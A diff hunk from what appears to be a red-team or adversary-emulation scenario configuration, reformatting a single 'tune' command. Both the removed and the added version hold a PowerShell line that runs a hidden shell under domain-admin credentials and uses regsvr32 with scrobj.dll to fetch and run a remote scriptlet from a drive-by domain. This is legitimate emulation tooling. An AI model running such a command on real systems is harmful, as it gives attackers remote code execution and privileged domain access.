@@ -248,19 +248,7 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_1_elevated",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$password = ConvertTo-SecureString '",
-                            "self.domain_admin_password",
-                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
-                            "self.domain_admin_username",
-                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{powershell -c regsvr32.exe /s /n /i:http://",
-                            "self.driveby_domain3",
-                            "/",
-                            "self.tool_name3",
-                            " scrobj.dll}'};echo 'Done'"
-                        ]
-                    }
+                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{powershell -c regsvr32.exe /s /n /i:http://${self.driveby_domain3}/${self.tool_name3} scrobj.dll}'};echo 'Done'"
                 }
             }
         },
